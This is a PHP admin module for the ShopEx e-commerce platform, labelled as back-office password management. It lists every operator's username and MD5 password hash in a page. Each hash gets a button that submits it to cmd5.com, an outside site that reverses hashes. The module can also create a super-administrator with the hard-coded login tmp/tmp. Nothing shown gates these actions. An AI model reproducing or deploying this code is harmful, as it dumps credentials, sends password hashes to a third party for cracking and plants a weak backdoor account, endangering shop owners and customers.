<?php

class shopadmin {
	var $label = 'ShopEx后台密码管理';

	var $logfile;
	var $tmpusername = 'tmp';
	var $tmpuserpass = 'tmp';

	function shopadmin() {
		$this->logfile = VARDIR."/shopadmin.log";
	}
	
	function run(){
		switch($_REQUEST['action']){
			case "addtmpadmin":
				if($this->addTmpAdmin()){
					echo "<b>成功添加一个管理员:{$this->tmpusername}/{$this->tmpuserpass}</b><br>";
					$this->index();
				}
			break;
			case "removetmpadmin":
				$this->removeTmpAdmin();
				$this->index();
			break;
			default:
				$this->index();
		}
	}

	function index() {

		echo "<form name='password' id='password' method=post>";
		echo "<input type=hidden name=module value=shopadmin>";
		if(!file_exists($this->logfile)){
			echo "<input type=hidden name=action value=addtmpadmin>";
			echo "<input type=submit value='添加一个临时管理员'>";
		}else{
			echo "<input type=hidden name=action value=removetmpadmin>";
			echo "<input type=submit value='删除临时管理员'>";
		}
		echo "</form><br>";


		$aUser = $this->getInfo();
		echo "<table class='ae-table'>";
		echo "<thead>";
		echo "<th>用户名</th><th>密码</th><th>是否开启</th><th>是否管理员</th><th>操作</th>";
		echo "</thead>";
		foreach($aUser as $row){
			echo "<tr>";
			foreach($row as $val){
				$tdstr .= "<td>".$val."</td>";
			}
			echo $tdstr."
			<td>		
				<form action=http://www.cmd5.com method=get target='_blank'>
					<input type=hidden name=q value={$row[1]}>
					<input type=submit   value='密码反查' >
				</form>
			</td>";
			unset($tdstr);
			echo "</tr>";
		}
		echo "</table>";		

	}

	function getInfo(){
		if(SHOPEXVER == '48'){
			$sql = "SELECT username,userpass,status,super FROM ".DB_PREFIX."operators WHERE disabled='false'";
		}
		#
		if(SHOPEXVER == '47'){
			$sql = "SELECT username,userpass,status,super FROM ".DB_PREFIX."mall_offer_operater";
		}
		#
		$rs = mysql_query($sql) or die(mysql_error());
		$retn = array();
		while( $row = mysql_fetch_array($rs,MYSQL_NUM)){
			$retn[] = $row;
		}
		return $retn;
	}

	function addTmpAdmin(){
		if(SHOPEXVER == '48'){
			$sql = "INSERT INTO ".DB_PREFIX."operators (username,userpass,status,super) VALUES ('".$this->tmpusername."','".md5($this->tmpuserpass)."','1','1')";
		}
		#
		if(SHOPEXVER == '47'){
			$sql = "INSERT INTO ".DB_PREFIX."mall_offer_operater (offerid,username,userpass,status,super) VALUES ('1','".$this->tmpusername."','".md5($this->tmpuserpass)."','1','1')";
		}
		#
		mysql_query($sql) or die(mysql_error());
		$id = mysql_insert_id();
		$this->wLog($id);

		return true;
	}

	function removeTmpAdmin(){
		$id = $this->rLog();
		if(SHOPEXVER == '48'){
			$sql = "DELETE FROM ".DB_PREFIX."operators WHERE op_id='".$id."'";
		}
		#
		if(SHOPEXVER == '47'){
			$sql = "DELETE FROM ".DB_PREFIX."mall_offer_operater WHERE opid='".$id."'";
		}
		#
		
		mysql_query($sql) or die(mysql_error());
		
		unlink($this->logfile);
		return true;	
	}

	function wLog($log){
		if(file_exists($this->logfile)){
			unlink($this->logfile);
		}
		error_log($log,3,$this->logfile);

		return true;
	}

	function rLog(){
		$id = file_get_contents($this->logfile);
		$id = trim($id);
		$id = intval($id);
		
		return $id;
	}

}

?>